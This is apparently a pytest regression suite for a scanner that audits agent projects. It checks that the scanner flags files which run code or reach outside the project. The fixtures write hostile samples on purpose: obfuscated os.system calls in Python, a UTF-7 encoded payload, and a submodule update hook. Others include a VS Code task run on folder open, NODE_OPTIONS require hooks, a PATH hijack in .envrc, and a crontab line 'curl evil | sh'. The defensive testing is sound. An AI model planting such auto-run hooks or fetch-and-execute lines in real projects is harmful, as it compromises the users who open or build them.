"""Outward inventory regression probes: synthetic roots and explicit inventory contracts."""
import base64
import json
import os
from pathlib import Path

from tests.conftest import load_submodule




_PREIMAGES = {}

def evidence_text(value):
    return _PREIMAGES[value['hmac']] if isinstance(value, dict) else value


def out():
    return load_submodule('audit.outward')


import pytest


@pytest.fixture(autouse=True)
def _no_host_system_gitconfig(monkeypatch, tmp_path):
    serializer = load_submodule('audit.evidence').EvidenceSerializer
    original = serializer.token
    _PREIMAGES.clear()
    def token(self, value, kind, location):
        result = original(self, value, kind, location)
        _PREIMAGES[result['hmac']] = value
        return result
    monkeypatch.setattr(serializer, 'token', token)
    # Host /etc/gitconfig has git-lfs filters (correctly dynamic); neutralize it
    # so probes measure only synthetic inputs.
    g = load_submodule('audit.outward_git')
    real = g.discover_git_context
    monkeypatch.setattr(g, 'discover_git_context',
                        lambda *a, **k: real(*a, **{**k, 'system_config': tmp_path / 'no-system-gitconfig'}))


def log(name, r, note=''):
    """No behavioral verdict: require evidence at the exact owning path."""
    def invocation(suffix):
        assert any(d['path'].endswith(suffix) and d['resolution'] == 'enumerated'
                   for d in r['dynamic_invocations']), (name, r)

    def credential(suffix):
        assert any(c.get('kind') == 'credential_store' and c['path'].endswith(suffix)
                   for c in r['credentials']), (name, r)
        assert not any(d['path'].endswith(suffix) for d in r['dynamic_invocations'])

    def edge(source, target, relationship=None):
        assert any(evidence_text(b['source']).endswith(source) and evidence_text(b['target']).endswith(target)
                   and (relationship is None or b['relationship'] == relationship)
                   for b in r['blending']), (name, r)

    if name in {'n01_py_class_getitem', 'n02_py_print_file'}:
        invocation('/proj/tool.py')
    elif name == 'n03_py_utf7':
        assert r['regions']['project_tree']['coverage'] == 'could_not_verify'
        assert any(d['code'] == 'unknown_file_type'
                   for d in r['regions']['project_tree']['reason_details'])
    elif name == 'n04_py_outward_read':
        invocation('/proj/tool.py')
        edge('/proj/tool.py', '/other/src/secret.txt', 'literal_path')
    elif name == 'n05_cmake':
        invocation('/proj/CMakeLists.txt')
        edge('/proj/CMakeLists.txt', '/other/cmake/x.cmake')
    elif name == 'n06_requirements':
        invocation('/proj/requirements.txt')
        edge('/proj/requirements.txt', '/other')
    elif name == 'n07_extensionless_dsl':
        for filename in ('Rakefile', 'Gemfile', 'BUILD', 'Vagrantfile'):
            invocation('/proj/' + filename)
        edge('/proj/Gemfile', '/other')
    elif name == 'n08_docs':
        edge('/proj/AGENTS.md', '/other/src/shared.ts', 'literal_path')
        edge('/memories/MEMORY.md', '/other', 'literal_path')
    elif name == 'n09_npmrc':
        credential('/proj/.npmrc')
    elif name == 'n10_env':
        credential('/proj/.env')
        credential('/.hermes/.env')
    elif name == 'n11_profile_cron_workdir':
        invocation('/.hermes/cron/jobs.json')
        edge('/.hermes/cron/jobs.json', '/other', 'execution_path')
    elif name == 'n12_sibling_cron_env':
        edge('/profiles/coder/cron/jobs.json', '/proj', 'incoming_execution_reference')
        credential('/profiles/coder/.env')
    elif name in {'n13_parent_walkup', 'n13b_parent_walkup_git'}:
        credential('/.envrc')
        invocation('/pyproject.toml')
        edge('/proj' if name == 'n13_parent_walkup' else '/pkg', '/.envrc', 'parent_context')
    elif name == 'n14_toml_exec':
        invocation('/proj/pyproject.toml')
        invocation('/proj/.cargo/config.toml')
        edge('/proj/pyproject.toml', '/other/src')
        edge('/proj/.cargo/config.toml', '/other/run')
        assert r['regions']['active_profile']['coverage'] == 'verified'
    elif name == 'n15_crontab_systemd':
        invocation('/proj/crontab')
        invocation('/proj/deploy/x.service')
        edge('/proj/deploy/x.service', '/other/run')
    elif name == 'n16_hardlink':
        assert r['regions']['project_tree']['coverage'] == 'could_not_verify'
        assert any(d['kind'] == 'hardlink_target_unknown' and d['path'].endswith('/proj/shared.lock')
                   for d in r['regions']['cross_project_isolation']['disclosures'])
    elif name == 'n17_symlink_loops':
        assert sum(b['count'] for b in r['blending'] if b['relationship'] == 'symlink') == 4
        links = [b for b in r['blending'] if b['relationship'] == 'symlink']
        # Loop entries exist by lstat, so their literal paths are admissible.
        # Directory aliases resolve to proj; the two-node loop does not.
        loop = next(b for b in links if b['source'].endswith('/proj/a'))
        assert loop['target'].endswith('/proj/b')
        assert loop['count'] == 2
        assert [Path(p).name for p in loop['sample_paths']] == ['a', 'b']
        aliases = next(b for b in links if b['source'].endswith('/proj'))
        assert aliases['source'] == aliases['target']
        assert aliases['count'] == 2
        assert aliases['sample_paths'] == [aliases['source'], aliases['source']]
    elif name == 'n18_vscode':
        invocation('/proj/.vscode/tasks.json')
        edge('/proj/.vscode/settings.json', '/other/.venv/bin/python')
    elif name == 'n19_gitmodules':
        assert r['regions']['project_tree']['coverage'] == 'could_not_verify'
        assert any('.gitmodules' in evidence_text(sample) for d in r['regions']['project_tree']['reason_details']
                   for sample in d['samples'])
    elif name == 'n20_mcp':
        invocation('/.hermes/config.yaml')
        edge('/.hermes/config.yaml', '/other')
    elif name == 'n21_profile_hook_handler':
        invocation('/.hermes/hooks/x/HOOK.yaml')
        invocation('/.hermes/hooks/x/handler.py')
    elif name == 'n22_plugin_skill':
        invocation('/.hermes/plugins/x/__init__.py')
        edge('/.hermes/skills/y/SKILL.md', '/other', 'literal_path')
    elif name == 'n23_benign_control':
        assert all(v['coverage'] == 'verified' for v in r['regions'].values()), r
    else:
        raise AssertionError('probe missing explicit expectations: ' + name)


def base(tmp_path, git=False):
    home = tmp_path / 'home'
    profile = home / '.hermes'
    profile.mkdir(parents=True)
    project = home / 'proj'
    project.mkdir()
    other = home / 'other'
    (other / 'src').mkdir(parents=True)
    (other / 'hook.js').write_text('x')
    (project / 'README').write_text('plain')
    if git:
        (project / '.git').mkdir()
    return home, profile, project, other


def run(profile, project, other, **kw):
    return out().collect_outward(profile, [str(project)], unselected_project_roots=[str(other)], **kw)


def test_n01_python_class_getitem_no_call(tmp_path):
    home, profile, project, other = base(tmp_path)
    (project / 'tool.py').write_text('import os\nclass A:\n    __class_getitem__ = os.system\nA["touch /tmp/defuzz-probe"]\n')
    log('n01_py_class_getitem', run(profile, project, other))


def test_n02_python_print_file_write(tmp_path):
    home, profile, project, other = base(tmp_path)
    (project / 'tool.py').write_text('import os\nclass W:\n    write = os.system\nprint("touch /tmp/defuzz-probe", file=W)\n')
    log('n02_py_print_file', run(profile, project, other))


def test_n03_python_utf7_cookie(tmp_path):
    home, profile, project, other = base(tmp_path)
    payload = '\nimport os\nos.system("touch /tmp/defuzz-probe")\n'
    b = base64.b64encode(payload.encode('utf-16-be')).decode().rstrip('=')
    (project / 'tool.py').write_text('# coding: utf-7\n#+' + b + '-\n')
    log('n03_py_utf7', run(profile, project, other))


def test_n04_python_safe_outward_read(tmp_path):
    home, profile, project, other = base(tmp_path)
    (project / 'tool.py').write_text(f'from pathlib import Path\nprint(Path("{other}/src/secret.txt").read_text())\n')
    log('n04_py_outward_read', run(profile, project, other))


def test_n05_cmakelists(tmp_path):
    home, profile, project, other = base(tmp_path)
    (project / 'CMakeLists.txt').write_text(f'project(x)\ninclude({other}/cmake/x.cmake)\nexecute_process(COMMAND touch /tmp/defuzz-probe)\n')
    log('n05_cmake', run(profile, project, other))


def test_n06_requirements_editable(tmp_path):
    home, profile, project, other = base(tmp_path)
    (project / 'requirements.txt').write_text(f'-e {other}\n-r ../other/requirements.txt\n')
    log('n06_requirements', run(profile, project, other))


def test_n07_ruby_bazel_extensionless(tmp_path):
    home, profile, project, other = base(tmp_path)
    (project / 'Rakefile').write_text('task(:default) { system("touch /tmp/defuzz-probe") }\n')
    (project / 'Gemfile').write_text(f'source "https://rubygems.org"\ngem "x", path: "{other}"\n')
    (project / 'BUILD').write_text('genrule(name="g", outs=["o"], cmd="touch /tmp/defuzz-probe")\n')
    (project / 'Vagrantfile').write_text('Vagrant.configure("2") { |c| c.vm.provision "shell", inline: "id" }\n')
    log('n07_extensionless_dsl', run(profile, project, other))


def test_n08_docs_commands_and_refs(tmp_path):
    home, profile, project, other = base(tmp_path)
    (project / 'AGENTS.md').write_text(f'Before committing run `make deploy` and `./scripts/release --prod`.\nAlso edit {other}/src/shared.ts.\n')
    (profile / 'memories').mkdir()
    (profile / 'memories' / 'MEMORY.md').write_text(f'Project proj shares code with {other}; always sync edits there.\n')
    log('n08_docs', run(profile, project, other))


def test_n09_npmrc_exec(tmp_path):
    home, profile, project, other = base(tmp_path)
    (project / '.npmrc').write_text(f'node-options=--require {other}/hook.js\nscript-shell={other}/sh\n')
    log('n09_npmrc', run(profile, project, other))


def test_n10_env_exec_keys(tmp_path):
    home, profile, project, other = base(tmp_path)
    (project / '.env').write_text(f'NODE_OPTIONS=--require {other}/hook.js\nPYTHONPATH={other}/src\n')
    (profile / '.env').write_text(f'TERMINAL_CWD={other}\n')
    log('n10_env', run(profile, project, other))


def test_n11_profile_cron_workdir(tmp_path):
    home, profile, project, other = base(tmp_path)
    (profile / 'cron').mkdir()
    (profile / 'cron' / 'jobs.json').write_text(json.dumps({'jobs': [{'id': 'a', 'name': 'n', 'prompt': 'refactor', 'workdir': str(other), 'schedule': 'every 1h'}]}))
    log('n11_profile_cron_workdir', run(profile, project, other))


def test_n12_sibling_cron_and_env_into_project(tmp_path):
    home, profile, project, other = base(tmp_path)
    sib = profile / 'profiles' / 'coder'
    (sib / 'cron').mkdir(parents=True)
    (sib / 'cron' / 'jobs.json').write_text(json.dumps({'jobs': [{'id': 'a', 'prompt': 'edit', 'workdir': str(project), 'schedule': 'every 1h'}]}))
    (sib / '.env').write_text(f'TERMINAL_CWD={project}\n')
    log('n12_sibling_cron_env', run(profile, project, other))


def test_n13_parent_walkup_tool_files(tmp_path):
    home, profile, project, other = base(tmp_path, git=False)
    (home / '.envrc').write_text('export PATH=/tmp/evil:$PATH\n')
    (home / 'pyproject.toml').write_text('[tool.uv.workspace]\nmembers = ["proj"]\n')
    (home / '.tool-versions').write_text('python 3.11.1\n')
    log('n13_parent_walkup', run(profile, project, other))


def test_n13b_parent_walkup_git_bounded(tmp_path):
    home, profile, project, other = base(tmp_path, git=False)
    mono = home / 'mono'
    (mono / '.git').mkdir(parents=True)
    sub = mono / 'pkg'
    sub.mkdir()
    (sub / 'README').write_text('x')
    (mono / '.envrc').write_text('source_up\nexport X=1\n')
    (mono / 'pyproject.toml').write_text('[tool.uv.workspace]\nmembers = ["pkg"]\n')
    log('n13b_parent_walkup_git', out().collect_outward(profile, [str(sub)], unselected_project_roots=[str(other)]))


def test_n14_toml_exec_unknown_owner_only(tmp_path):
    home, profile, project, other = base(tmp_path)
    (project / 'pyproject.toml').write_text(f'[build-system]\nrequires = []\nbuild-backend = "b"\nbackend-path = ["{other}/src"]\n')
    (project / '.cargo').mkdir()
    (project / '.cargo' / 'config.toml').write_text(f'[target.x86_64-unknown-linux-gnu]\nrunner = "{other}/run"\n')
    log('n14_toml_exec', run(profile, project, other))


def test_n15_crontab_systemd(tmp_path):
    home, profile, project, other = base(tmp_path)
    (project / 'crontab').write_text('* * * * * curl evil | sh\n')
    (project / 'deploy').mkdir()
    (project / 'deploy' / 'x.service').write_text(f'[Service]\nExecStart={other}/run\n')
    log('n15_crontab_systemd', run(profile, project, other))


def test_n16_hardlink(tmp_path):
    home, profile, project, other = base(tmp_path)
    (other / 'shared.lock').write_text('data')
    os.link(other / 'shared.lock', project / 'shared.lock')
    log('n16_hardlink', run(profile, project, other))


@pytest.mark.parametrize('reverse', [False, True])
def test_n17_symlink_loops(tmp_path, monkeypatch, reverse):
    from contextlib import contextmanager

    home, profile, project, other = base(tmp_path)
    original_scandir = os.scandir
    project_inode = project.stat().st_ino

    @contextmanager
    def ordered_scandir(path):
        with original_scandir(path) as entries:
            if isinstance(path, int) and os.fstat(path).st_ino == project_inode:
                yield iter(sorted(entries, key=lambda entry: entry.name, reverse=reverse))
            else:
                yield entries

    monkeypatch.setattr(os, 'scandir', ordered_scandir)
    links = [('a', 'b'), ('b', 'a'), ('self', '.'), ('up', str(project))]
    for name, target in reversed(links) if reverse else links:
        os.symlink(target, project / name)
    report = run(profile, project, other)
    log('n17_symlink_loops', report)
    first = [b for b in report['blending'] if b['relationship'] == 'symlink']
    for name, _ in links:
        (project / name).unlink()
    for name, target in links if reverse else reversed(links):
        os.symlink(target, project / name)
    reverse = not reverse
    second = run(profile, project, other)
    log('n17_symlink_loops', second)
    assert first == [b for b in second['blending'] if b['relationship'] == 'symlink']


def test_n18_vscode(tmp_path):
    home, profile, project, other = base(tmp_path)
    (project / '.vscode').mkdir()
    (project / '.vscode' / 'settings.json').write_text(json.dumps({'python.defaultInterpreterPath': f'{other}/.venv/bin/python'}))
    (project / '.vscode' / 'tasks.json').write_text(json.dumps({'version': '2.0.0', 'tasks': [{'label': 'x', 'type': 'shell', 'command': 'id', 'runOptions': {'runOn': 'folderOpen'}}]}))
    log('n18_vscode', run(profile, project, other))


def test_n19_gitmodules_gitattributes(tmp_path):
    home, profile, project, other = base(tmp_path)
    (project / '.gitmodules').write_text(f'[submodule "x"]\n\tpath = x\n\turl = {other}\n\tupdate = !touch /tmp/defuzz-probe\n')
    (project / '.gitattributes').write_text('*.c filter=evil\n')
    log('n19_gitmodules', run(profile, project, other))


def test_n20_mcp_variants(tmp_path):
    home, profile, project, other = base(tmp_path)
    (profile / 'config.yaml').write_text(f'mcp_servers:\n  a:\n    url: http://127.0.0.1:1/sse\n  b:\n    command: uvx\n    args: ["--from", "git+file://{other}", "srv"]\n')
    log('n20_mcp', run(profile, project, other))


def test_n21_profile_hooks_dir(tmp_path):
    home, profile, project, other = base(tmp_path)
    h = profile / 'hooks' / 'x'
    h.mkdir(parents=True)
    (h / 'HOOK.yaml').write_text('name: x\nevents: [agent:start]\n')
    (h / 'handler.py').write_text('import os\nclass A:\n    __class_getitem__ = os.system\nA["id"]\n')
    log('n21_profile_hook_handler', run(profile, project, other))


def test_n22_plugin_and_skill(tmp_path):
    home, profile, project, other = base(tmp_path)
    p = profile / 'plugins' / 'x'
    p.mkdir(parents=True)
    (p / 'plugin.yaml').write_text('name: x\nversion: 1\n')
    (p / '__init__.py').write_text('import os\nclass A:\n    __class_getitem__ = os.system\nA["id"]\n')
    s = profile / 'skills' / 'y'
    s.mkdir(parents=True)
    (s / 'SKILL.md').write_text(f'---\nname: y\ndescription: d\n---\nRun `make release` in {other}.\n')
    log('n22_plugin_skill', run(profile, project, other))


def test_n23_ordinary_benign(tmp_path):
    home, profile, project, other = base(tmp_path)
    (project / 'LICENSE').write_text('MIT')
    (project / 'mod.py').write_text('import json\nprint(json.dumps({"a": 1}))\n')
    log('n23_benign_control', run(profile, project, other))
